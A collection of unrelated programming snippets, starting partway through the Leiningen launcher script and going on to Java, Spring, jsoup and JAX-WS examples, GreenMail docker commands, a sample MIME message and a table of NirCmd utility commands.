    # If project.clj for lein or leiningen-core changes, we must recalculate
    LAST_PROJECT_CHECKSUM=$(cat "$LEIN_DIR/.lein-project-checksum" 2> /dev/null)
    PROJECT_CHECKSUM=$(sum "$LEIN_DIR/project.clj" "$LEIN_DIR/leiningen-core/project.clj")
    if [ "$PROJECT_CHECKSUM" != "$LAST_PROJECT_CHECKSUM" ]; then
        if [ -r "$LEIN_DIR/.lein-classpath" ]; then
            rm "$LEIN_DIR/.lein-classpath"
        fi
    fi

    # Use bin/lein to calculate its own classpath.
    if [ ! -r "$LEIN_DIR/.lein-classpath" ] && [ "$1" != "classpath" ]; then
        echo "Recalculating Leiningen's classpath."
        ORIG_PWD="$PWD"
        cd "$LEIN_DIR"

        LEIN_NO_USER_PROFILES=1 $0 classpath .lein-classpath
        sum "$LEIN_DIR/project.clj" "$LEIN_DIR/leiningen-core/project.clj" > \
            .lein-project-checksum
        cd "$ORIG_PWD"
    fi

    mkdir -p "$LEIN_DIR/target/classes"
    export LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Dclojure.compile.path=$LEIN_DIR/target/classes"
    add_path CLASSPATH "$LEIN_DIR/leiningen-core/src/" "$LEIN_DIR/leiningen-core/resources/" \
        "$LEIN_DIR/test:$LEIN_DIR/target/classes" "$LEIN_DIR/src" ":$LEIN_DIR/resources"

    if [ -r "$LEIN_DIR/.lein-classpath" ]; then
        add_path CLASSPATH "$(cat "$LEIN_DIR/.lein-classpath" 2> /dev/null)"
    else
        add_path CLASSPATH "$(cat "$LEIN_DIR/leiningen-core/.lein-bootstrap" 2> /dev/null)"
    fi
else # Not running from a checkout
    add_path CLASSPATH "$LEIN_JAR"

    BOOTCLASSPATH="-Xbootclasspath/a:$LEIN_JAR"

    if [ ! -r "$LEIN_JAR" -a "$1" != "self-install" ]; then
        self_install
    fi
fi

if [ ! -x "$JAVA_CMD" ] && ! type -f java >/dev/null
then
    >&2 echo "Leiningen coundn't find 'java' executable, which is required."
    >&2 echo "Please either set JAVA_CMD or put java (>=1.6) in your \$PATH ($PATH)."
    exit 1
fi

export LEIN_JAVA_CMD="${LEIN_JAVA_CMD:-${JAVA_CMD:-java}}"

if [[ -z "${DRIP_INIT+x}" && "$(basename "$LEIN_JAVA_CMD")" == *drip* ]]; then
    export DRIP_INIT="$(printf -- '-e\n(require (quote leiningen.repl))')"
    export DRIP_INIT_CLASS="clojure.main"
fi

# Support $JAVA_OPTS for backwards-compatibility.
export JVM_OPTS="${JVM_OPTS:-"$JAVA_OPTS"}"

# Handle jline issue with cygwin not propagating OSTYPE through java subprocesses: https://github.com/jline/jline2/issues/62
cygterm=false
if $cygwin; then
  case "$TERM" in
    rxvt* | xterm* | vt*) cygterm=true ;;
  esac
fi

if $cygterm; then
  LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Djline.terminal=jline.UnixTerminal"
  stty -icanon min 1 -echo > /dev/null 2>&1
fi

# TODO: investigate http://skife.org/java/unix/2011/06/20/really_executable_jars.html
# If you're packaging this for a package manager (.deb, homebrew, etc)
# you need to remove the self-install and upgrade functionality or see lein-pkg.
if [ "$1" = "self-install" ]; then
    if [ -r "$BIN_DIR/../src/leiningen/version.clj" ]; then
        echo "Running self-install from a checkout is not supported."
        echo "See CONTRIBUTING.md for SNAPSHOT-specific build instructions."
        exit 1
    fi
    echo "Manual self-install is deprecated; it will run automatically when necessary."
    self_install
elif [ "$1" = "upgrade" ] || [ "$1" = "downgrade" ]; then
    if [ "$LEIN_DIR" != "" ]; then
        echo "The upgrade task is not meant to be run from a checkout."
        exit 1
    fi
    if [ $SNAPSHOT = "YES" ]; then
        echo "The upgrade task is only meant for stable releases."
        echo "See the \"Bootstrapping\" section of CONTRIBUTING.md."
        exit 1
    fi
    if [ ! -w "$SCRIPT" ]; then
        echo "You do not have permission to upgrade the installation in $SCRIPT"
        exit 1
    else
        TARGET_VERSION="${2:-stable}"
        echo "The script at $SCRIPT will be upgraded to the latest $TARGET_VERSION version."
        echo -n "Do you want to continue [Y/n]? "
        read RESP
        case "$RESP" in
            y|Y|"")
                echo
                echo "Upgrading..."
                TARGET="/tmp/lein-$$-upgrade"
                if $cygwin; then
                    TARGET=$(cygpath -w "$TARGET")
                fi
                LEIN_SCRIPT_URL="https://github.com/technomancy/leiningen/raw/$TARGET_VERSION/bin/lein"
                $HTTP_CLIENT "$TARGET" "$LEIN_SCRIPT_URL"
                if [ $? == 0 ]; then
                    cmp -s "$TARGET" "$SCRIPT"
                    if [ $? == 0 ]; then
                        echo "Leiningen is already up-to-date."
                    fi
                    mv "$TARGET" "$SCRIPT" && chmod +x "$SCRIPT"
                    exec "$SCRIPT" version
                else
                    download_failed_message "$LEIN_SCRIPT_URL"
                fi;;
            *)
                echo "Aborted."
                exit 1;;
        esac
    fi
else
    if $cygwin; then
        # When running on Cygwin, use Windows-style paths for java
        ORIGINAL_PWD=$(cygpath -w "$ORIGINAL_PWD")
    fi

    # apply context specific CLASSPATH entries
    if [ -f .lein-classpath ]; then
        add_path CLASSPATH "$(cat .lein-classpath)"
    fi

    if [ -n "$DEBUG" ]; then
        echo "Leiningen's classpath: $CLASSPATH"
    fi

    if [ -r .lein-fast-trampoline ]; then
        export LEIN_FAST_TRAMPOLINE='y'
    fi

    if [ "$LEIN_FAST_TRAMPOLINE" != "" ] && [ -r project.clj ]; then
        INPUTS="$* $(cat project.clj) $LEIN_VERSION $(test -f "$LEIN_HOME/profiles.clj" && cat "$LEIN_HOME/profiles.clj")"

        if command -v shasum >/dev/null 2>&1; then
            SUM="shasum"
        elif command -v sha1sum >/dev/null 2>&1; then
            SUM="sha1sum"
        else
            command_not_found "sha1sum or shasum"
        fi

        export INPUT_CHECKSUM=$(echo "$INPUTS" | $SUM | cut -f 1 -d " ")
        # Just don't change :target-path in project.clj, mkay?
        TRAMPOLINE_FILE="target/trampolines/$INPUT_CHECKSUM"
    else
        if hash mktemp 2>/dev/null; then
            # Check if mktemp is available before using it
            TRAMPOLINE_FILE="$(mktemp /tmp/lein-trampoline-XXXXXXXXXXXXX)"
        else
            TRAMPOLINE_FILE="/tmp/lein-trampoline-$$"
        fi
        trap "rm -f $TRAMPOLINE_FILE" EXIT
    fi

    if $cygwin; then
        TRAMPOLINE_FILE=$(cygpath -w "$TRAMPOLINE_FILE")
    fi

    if [ "$INPUT_CHECKSUM" != "" ] && [ -r "$TRAMPOLINE_FILE" ]; then
        if [ -n "$DEBUG" ]; then
            echo "Fast trampoline with $TRAMPOLINE_FILE."
        fi
        exec sh -c "exec $(cat "$TRAMPOLINE_FILE")"
    else
        export TRAMPOLINE_FILE
        "$LEIN_JAVA_CMD" \
            "${BOOTCLASSPATH[@]}" \
            -Dfile.encoding=UTF-8 \
            -Dmaven.wagon.http.ssl.easy=false \
            -Dmaven.wagon.rto=10000 \
            $LEIN_JVM_OPTS \
            -Dleiningen.original.pwd="$ORIGINAL_PWD" \
            -Dleiningen.script="$SCRIPT" \
            -classpath "$CLASSPATH" \
            clojure.main -m leiningen.core.main "$@"

        EXIT_CODE=$?

        if $cygterm ; then
          stty icanon echo > /dev/null 2>&1
        fi

        ## TODO: [ -r "$TRAMPOLINE_FILE" ] may be redundant? A trampoline file
        ## is always generated these days.
        if [ -r "$TRAMPOLINE_FILE" ] && [ "$LEIN_TRAMPOLINE_WARMUP" = "" ]; then
            TRAMPOLINE="$(cat "$TRAMPOLINE_FILE")"
            if [ "$INPUT_CHECKSUM" = "" ]; then
                rm "$TRAMPOLINE_FILE"
            fi
            if [ "$TRAMPOLINE" = "" ]; then
                exit $EXIT_CODE
            else
                exec sh -c "exec $TRAMPOLINE"
            fi
        else
            exit $EXIT_CODE
        fi
    fi
fi
--------------------------------------------------------------------------------------------------------
MessageFormat format = new MessageFormat("The number is {0, number}", Locale.GERMAN);
String s = format.format(new Object[] {number});
--------------------------------------------------------------------------------------------------------
// class name is awful for this example, but it will make more sense if you
//  read further
public interface MetaDataKey<T extends Serializable> extends Serializable
{
    T getValue();
}

public final class TypeSafeKeys
{
    static enum StringKeys implements MetaDataKey<String>
    {
        A1("key1");

        private final String value;

        StringKeys(String value) { this.value = value; }

        @Override
        public String getValue() { return value; }
    }

    static enum IntegerKeys implements MetaDataKey<Integer>
    {
        A2(0);

        private final Integer value;

        IntegerKeys (Integer value) { this.value = value; }

        @Override
        public Integer getValue() { return value; }
    }

    public static final MetaDataKey<String> A1 = StringKeys.A1;
    public static final MetaDataKey<Integer> A2 = IntegerKeys.A2;
}
--------------------------------------------------------------------------------------------------------
chrome://about/
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableAutoConfiguration
@EnableConfigurationProperties
public class MapBindingSample {

    public static void main(String[] args) throws Exception {
        System.out.println(SpringApplication.run(MapBindingSample.class, args)
                .getBean(Test.class).getInfo());
    }

    @Bean
    @ConfigurationProperties
    public Test test() {
        return new Test();
    }

    public static class Test {

        private Map<String, Object> info = new HashMap<String, Object>();

        public Map<String, Object> getInfo() {
            return this.info;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Value("#{systemProperties['priority']}")
private String spelValue;

@Value("#{systemProperties['unknown'] ?: 'some default'}")
private String spelSomeDefault;

@Value("#{someBean.someValue}")
private Integer someBeanValue;

@Value("#{'${listOfValues}'.split(',')}")
private List<String> valuesList;

@Value("#{${valuesMap}}")
private Map<String, Integer> valuesMap;

@Value("#{${valuesMap}.key1}")
private Integer valuesMapKey1;

@Value("#{${unknownMap : {key1: '1', key2: '2'}}}")
private Map<String, Integer> unknownMap;
 
@Value("#{${valuesMap}['unknownKey'] ?: 5}")
private Integer unknownMapKeyWithDefaultValue;

@Value("#{${valuesMap}.?[value>'1']}")
private Map<String, Integer> valuesMapFiltered;

@Value("#{systemProperties}")
private Map<String, String> systemPropertiesMap;
--------------------------------------------------------------------------------------------------------
docker pull greenmail/standalone:1.5.10
docker run -t -i -p 3025:3025 -p 3110:3110 -p 3143:3143 \
                 -p 3465:3465 -p 3993:3993 -p 3995:3995 \
                 greenmail/standalone:1.5.10
docker run -t -i \
           -e GREENMAIL_OPTS='-Dgreenmail.setup.test.all -Dgreenmail.hostname=0.0.0.0 -Dgreenmail.auth.disabled -Dgreenmail.verbose' \
           -e JAVA_OPTS='-Djava.net.preferIPv4Stack=true -Xmx512m' \
           -p 3025:3025 -p 3110:3110 -p 3143:3143 \
           -p 3465:3465 -p 3993:3993 -p 3995:3995 \
           greenmail/standalone:1.5.4
--------------------------------------------------------------------------------------------------------
        <plugin>
          <!-- http://maven.apache.org/plugins/maven-surefire-plugin/plugin-info.html -->
          <artifactId>maven-surefire-plugin</artifactId>
          <version>3.0.0-M3</version>
          <configuration>
            <forkCount>1</forkCount>
            <reuseForks>true</reuseForks>
            <!-- cli -->
            <workingDirectory>target</workingDirectory>
            <!-- Fix https://talk.openmrs.org/t/error-could-not-find-or-load-main-class-org-apache-maven-surefire-booter-forkedbooter/20509 -->
            <argLine>-Djdk.net.URLClassPath.disableClassPathURLCheck=true</argLine>
          </configuration>
        </plugin>
--------------------------------------------------------------------------------------------------------
<argLine>-Xmx512m -enableassertions</argLine>
--------------------------------------------------------------------------------------------------------
https://www.ittsystems.com/wifi-analyzers-for-windows/
--------------------------------------------------------------------------------------------------------
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=frontier

This is a message with multiple parts in MIME format.
--frontier
Content-Type: text/plain

This is the body of the message.
--frontier
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64

PGh0bWw+CiAgPGhlYWQ+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPHA+VGhpcyBpcyB0aGUg
Ym9keSBvZiB0aGUgbWVzc2FnZS48L3A+CiAgPC9ib2R5Pgo8L2h0bWw+Cg==
--frontier--
--------------------------------------------------------------------------------------------------------
Open the door of J: CD-ROM drive	nircmd.exe cdrom open j:
Close the door of Y: CD-ROM drive	nircmd.exe cdrom close y:
Speaks the text currently in the clipboard (For Windows XP/Vista/7/8).	speak text ~$clipboard$
Speaks the text stored inside speak.txt into speak.wav filename (For Windows XP/Vista/7/8).	speak file "c:\temp\speak.txt" 0 100 "c:\temp\speak.wav" 48kHz16BitStereo
Increase the system volume by 2000 units (out of 65535)	nircmd.exe changesysvolume 2000
Decrease the system volume by 5000 units (out of 65535)	nircmd.exe changesysvolume -5000
Set the volume to the highest value	nircmd.exe setsysvolume 65535
Mute the system volume	nircmd.exe mutesysvolume 1
Unmute the system volume	nircmd.exe mutesysvolume 0
Switch the system volume between the mute and normal state.	nircmd.exe mutesysvolume 2
Create a shortcut on your desktop that switch the system volume between the mute and normal state.	nircmd.exe cmdshortcut "~$folder.desktop$" "Switch Volume" mutesysvolume 2
Turn off the monitor	nircmd.exe monitor off
Start the default screen saver	nircmd.exe screensaver
Put your computer in 'standby' mode	nircmd.exe standby
log off the current user	nircmd.exe exitwin logoff
Ask if you want to reboot, and if you answer 'Yes', reboot the computer.	nircmd.exe qboxcom "Do you want to reboot ?" "question" exitwin reboot
Turn off your computer	nircmd.exe exitwin poweroff
Turn off all computers specified in computers.txt !	multiremote copy "c:\temp\computers.txt" exitwin poweroff force
Dial to "My Internet" connection	nircmd.exe rasdial "My Internet"
Disconnect the "My Internet" connection	nircmd.exe rashangup "My Internet"
Make your Internet Explorer windows 75% transparent ! (192 / 256)	nircmd.exe win trans ititle "internet explorer" 192
Minimize all your Internet Explorer windows	nircmd.exe win min class "IEFrame"
Close all your Internet Explorer windows	nircmd.exe win close class "IEFrame"
Close all your Explorer windows (My Computer, folders, and so on)	nircmd.exe win close class "CabinetWClass"
Hide all your Internet Explorer windows	nircmd.exe win hide class "IEFrame"
Show all your Internet Explorer windows (after you made them hidden with previous example)	nircmd.exe win show class "IEFrame"
Center all top-level windows	nircmd.exe win center alltop
Remove the title bar of My Computer window.	nircmd.exe win -style title "my computer" 0x00C00000
Return the title bar of My Computer window that we removed in the previous example.	nircmd.exe win +style title "my computer" 0x00C00000
Set the My Computer window to right-to-left order (For hebrew and arabic languages)	nircmd win +exstyle title "my computer" 0x00400000
Set all child windows of My Computer window to right-to-left order (For hebrew and arabic languages)	nircmd win child title "my computer" +exstyle all 0x00400000
Create a shortcut on your desktop that closes all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Close All IE" win close class "IEFrame"
Create a shortcut on your desktop that hides all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Hide All IE" win hide class "IEFrame"
Create a shortcut on your desktop that shows back all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Show All IE" win show class "IEFrame"
Set the Windows Calculator as top-most window (above all other windows)	nircmd.exe win settopmost title "Calculator" 1
Set the Windows Calculator back to regular window (non top-most window)	nircmd.exe win settopmost title "Calculator" 0
Create a shortcut to Windows calculator under Start Menu->Programs->Calculators	nircmd.exe shortcut "f:\winnt\system32\calc.exe" "~$folder.programs$\Calculators" "Windows Calculator"
Hide the desktop window	nircmd.exe win hide class progman
Show the desktop window (After hiding it in previous example)	nircmd.exe win show class progman
Hide the start button on the system tray	nircmd.exe win child class "Shell_TrayWnd" hide class "button"
Show the start button on the system tray	nircmd.exe win child class "Shell_TrayWnd" show class "button"
Hide the clock on the system tray	nircmd.exe win child class "Shell_TrayWnd" hide class "TrayClockWClass"
Show the clock on the system tray	nircmd.exe win child class "Shell_TrayWnd" show class "TrayClockWClass"
Kill (terminate) all instance of Internet Explorer processes	nircmd.exe killprocess iexplore.exe
Create a shortcut on your desktop that opens the door of K: CDROM drive when you run it.	nircmd.exe cmdshortcut "~$folder.desktop$" "Open CDROM" cdrom open k:
Create a shortcut to NirSoft Web site on your desktop	nircmd.exe urlshortcut "http://www.nirsoft.net" "~$folder.desktop$" "NirSoft"
Add NirSoft Web site to your Favorities under Links folder.	nircmd.exe urlshortcut "http://www.nirsoft.net" "~$folder.favorites$\Links" "NirSoft"
Create a shortcut to NirSoft Web site on the desktop of all computers listed in computers.txt	nircmd.exe multiremote copy "c:\temp\computers.txt" urlshortcut "http://www.nirsoft.net" "~$folder.common_desktop$" "NirSoft"
Set the display mode to 800x600x24bit colors	nircmd.exe setdisplay 800 600 24
Create a shortcut on the desktop that set the display mode to 800x600x24bit colors	nircmd.exe cmdshortcut "~$folder.desktop$" "800x600x24" setdisplay 800 600 24
Copy all shortcuts on your desktop to another folder (f:\temp\desktop).	nircmd.exe execmd copy "~$folder.desktop$\*.lnk" f:\temp\desktop
Restart your Apache server (under Windows NT/2000/XP/2003)	nircmd.exe service restart apache
Create a shortcut on your desktop that restarts the Apache server	nircmd.exe cmdshortcut "~$folder.desktop$" "Restart Apache" service restart apache
Restart your IIS	nircmd.exe service restart w3svc
Restart MySql	nircmd.exe service restart MySql
Open the desired Registry key/value in RegEdit	nircmd.exe regedit "HKLM\Software\Microsoft\Windows\CurrentVersion" "CommonFilesDir"
Open the Registry key that you copied to the clipboard in RegEdit.	nircmd regedit "~$clipboard$"
Disable the screen saver	nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 0
Enable the screen saver	nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1
Change the date/time of the specified filename (creation time and modified time)	nircmd.exe setfiletime "c:\temp\myfile.txt" "24-06-2003 17:57:11" "22-11-2005 10:21:56"
Copy your desktop folder path to the clipboard	nircmd.exe clipboard set ~$folder.desktop$
Copy your start menu folder path to the clipboard	nircmd.exe clipboard set ~$folder.start_menu$
Copy the content of info1.txt (simple text file) to the clipboard	nircmd.exe clipboard readfile "c:\My Files\info1.txt"
Add the text content of clipboard to info1.txt	nircmd.exe clipboard addfile "c:\My Files\info1.txt"
Clear the clipboard	nircmd.exe clipboard clear
Create all folders specified in "c:\temp\folders.txt". The folder path names are separated by CRLF characters.	nircmd.exe paramsfile "c:\temp\folders.txt" "" "" execmd md ~$fparam.1$
Install the specified .NET assembly in the global assembly cache (like gacutil)	nircmd.exe gac install "C:\temp\MyAssembly\bin\MyAssembly.dll"
Empty the recycle bin in all drives.	nircmd.exe emptybin
Answer 'Yes' to a standard Windows message-box.	nircmd.exe dlg "" "" click yes
Wait 2 seconds, and then save the current screen to shot.png	nircmd.exe cmdwait 2000 savescreenshot "f:\temp\shot.png"
Save 10 screenshots in a loop, and wait 60 seconds between the screenshot save calls. The filenames of the screenshot will contain the time and date of the saved screenshot.	nircmd.exe loop 10 60000 savescreenshot c:\temp\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
Wait until Firefox is closed, and then say "Firefox was closed"	nircmd.exe waitprocess firefox.exe speak text "Firefox was closed"
Run RegEdit with SYSTEM user (On Windows 7/8/Vista/2008), which allows you to view all hidden system Registry keys	nircmd.exe elevatecmd runassystem c:\windows\regedit.exe
--------------------------------------------------------------------------------------------------------
final String html = "<div>Hello jsoup world</div>";

Document doc = Jsoup.parse(html, "", Parser.xmlParser());
Element tag = doc;
--------------------------------------------------------------------------------------------------------
Document doc = Jsoup.connect("http://example.com").get();
doc.select("p").forEach(System.out::println);

Document docCustomConn = Jsoup.connect(blogUrl)
  .userAgent("Mozilla")
  .timeout(5000)
  .cookie("cookiename", "val234")
  .cookie("anothercookie", "ilovejsoup")
  .referrer("http://google.com")
  .header("headersecurity", "xyz123")
  .get();
  
Elements links = doc.select("a");
Elements sections = doc.select("section");
Elements logo = doc.select(".spring-logo--container");
Elements pagination = doc.select("#pagination_control");
Elements divsDescendant = doc.select("header div");
Elements divsDirect = doc.select("header > div");

Element pag = doc.getElementById("pagination_control");
Elements desktopOnly = doc.getElementsByClass("desktopOnly");

Element firstSection = sections.first();
Element lastSection = sections.last();
Element secondSection = sections.get(2);
Elements allParents = firstSection.parents();
Element parent = firstSection.parent();
Elements children = firstSection.children();
Elements siblings = firstSection.siblingElements();


Elements sectionParagraphs = firstSection.select(".paragraph");
Element firstArticle = doc.select("article").first();
Element timeElement = firstArticle.select("time").first();
String dateTimeOfFirstArticle = timeElement.attr("datetime");
Element sectionDiv = firstArticle.select("section div").first();
String sectionDivText = sectionDiv.text();
String articleHtml = firstArticle.html();
String outerHtml = firstArticle.outerHtml();


timeElement.attr("datetime", "2016-12-16 15:19:54.3");
sectionDiv.text("foo bar");
firstArticle.select("h2").html("<div><span></span></div>");

Element link = new Element(Tag.valueOf("a"), "")
  .text("Checkout this amazing website!")
  .attr("href", "http://baeldung.com")
  .attr("target", "_blank");
firstArticle.appendChild(link);


doc.select("li.navbar-link").remove();
firstArticle.select("img").remove();
--------------------------------------------------------------------------------------------------------
private void convertTablesToLists(final Document document) {
 // If a two column table, where the first col is always the same (and non-alphabetic), then drop
 // it and convert the other row to a list.
 document.select("table").forEach(table -> {
  String firstColumnValue = null;
  for (final Element tr : table.select("tr")) {
   final Elements cells = tr.select("td");
   if (cells.size() != 2) {
    return;
   }
   final Element cell = cells.first();
   final String first = cell.text().trim();
   if (firstColumnValue != null) {
    if (!firstColumnValue.equals(first)) {
     return;
    }
   } else {
    firstColumnValue = first;
   }
  }
  // If we are here then all the first columns are the same...
  // So we convert to a list...
  final Element ul = new Element(Tag.valueOf("ul"), "");
  for (final Element tr : table.select("tr")) {
   final Elements cells = tr.select("td");
   ul.appendElement("li").html(cells.last().html());
  }
  table.replaceWith(ul);
 });
}

 import org.jsoup.*;
import org.jsoup.nodes.*;
import org.jsoup.select.*;

public class MyJsoupExample {
  public static void main(String args[]) {
    String inputText = "<html><head></head><body><p><img src=\"getCustomers.do?custCode=2&customerId=3334&param1=123\"/></p>"
      + "<p>someText <img src=\"getCustomers.do?custCode=2&customerId=3340&param2=456\"/></p></body></html>";
    Document doc = Jsoup.parse(inputText);
    Elements myImgs = doc.select("img[src*=customerId=3340");
    for (Element element : myImgs) {
      element.replaceWith(new TextNode("my replaced text", ""));
    }
    System.out.println(doc.toString());
  }
}

private Element changeElementTag(Element e, String newTag) {
  Element newElement = document.createElement(newTag);
  /* JSoup gives us the live child list, so we need to make a copy. */
  List<Node> copyOfChildNodeList = new ArrayList<Node>();
  copyOfChildNodeList.addAll(e.childNodes());
  for (Node n : copyOfChildNodeList) {
    n.remove();
    newElement.appendChild(n);
  }
  e.replaceWith(newElement);
  return newElement;
}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlType;


/**
 * <p>Java class for updateEmployeeResponse complex type.
 * 
 * <p>The following schema fragment specifies the expected content contained within this class.
 * 
 * <pre>
 * &lt;complexType name="updateEmployeeResponse">
 *   &lt;complexContent>
 *     &lt;restriction base="{http://www.w3.org/2001/XMLSchema}anyType">
 *       &lt;sequence>
 *         &lt;element name="return" type="{http://bottomup.server.jaxws.baeldung.com/}employee" minOccurs="0"/>
 *       &lt;/sequence>
 *     &lt;/restriction>
 *   &lt;/complexContent>
 * &lt;/complexType>
 * </pre>
 * 
 * 
 */
@XmlAccessorType(XmlAccessType.FIELD)
@XmlType(name = "updateEmployeeResponse", propOrder = {
    "_return"
})
public class UpdateEmployeeResponse {

    @XmlElement(name = "return")
    protected Employee _return;

    /**
     * Gets the value of the return property.
     * 
     * @return
     *     possible object is
     *     {@link Employee }
     *     
     */
    public Employee getReturn() {
        return _return;
    }

    /**
     * Sets the value of the return property.
     * 
     * @param value
     *     allowed object is
     *     {@link Employee }
     *     
     */
    public void setReturn(Employee value) {
        this._return = value;
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.List;
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.xml.bind.annotation.XmlSeeAlso;
import javax.xml.ws.Action;
import javax.xml.ws.FaultAction;
import javax.xml.ws.RequestWrapper;
import javax.xml.ws.ResponseWrapper;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.9-b130926.1035
 * Generated source version: 2.2
 * 
 */
@WebService(name = "EmployeeService", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/")
@XmlSeeAlso({
    ObjectFactory.class
})
public interface EmployeeService {


    /**
     * 
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "getEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetEmployee")
    @ResponseWrapper(localName = "getEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployee/Fault/EmployeeNotFound")
    })
    public Employee getEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @param arg1
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "updateEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.UpdateEmployee")
    @ResponseWrapper(localName = "updateEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.UpdateEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/updateEmployee/Fault/EmployeeNotFound")
    })
    public Employee updateEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0,
        @WebParam(name = "arg1", targetNamespace = "")
        String arg1)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @return
     *     returns java.util.List<com.baeldung.jaxws.client.Employee>
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "getAllEmployees", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetAllEmployees")
    @ResponseWrapper(localName = "getAllEmployeesResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetAllEmployeesResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getAllEmployeesRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getAllEmployeesResponse")
    public List<Employee> getAllEmployees();

    /**
     * 
     * @param arg0
     * @return
     *     returns boolean
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "deleteEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.DeleteEmployee")
    @ResponseWrapper(localName = "deleteEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.DeleteEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/deleteEmployee/Fault/EmployeeNotFound")
    })
    public boolean deleteEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0)
        throws EmployeeNotFound_Exception
    ;

    /**
     * 
     * @param arg1
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeAlreadyExists_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "addEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.AddEmployee")
    @ResponseWrapper(localName = "addEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.AddEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployeeResponse", fault = {
        @FaultAction(className = EmployeeAlreadyExists_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/addEmployee/Fault/EmployeeAlreadyExists")
    })
    public Employee addEmployee(
        @WebParam(name = "arg0", targetNamespace = "")
        int arg0,
        @WebParam(name = "arg1", targetNamespace = "")
        String arg1)
        throws EmployeeAlreadyExists_Exception
    ;

    /**
     * 
     * @return
     *     returns int
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "countEmployees", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.CountEmployees")
    @ResponseWrapper(localName = "countEmployeesResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.CountEmployeesResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/countEmployeesRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/countEmployeesResponse")
    public int countEmployees();

}
--------------------------------------------------------------------------------------------------------
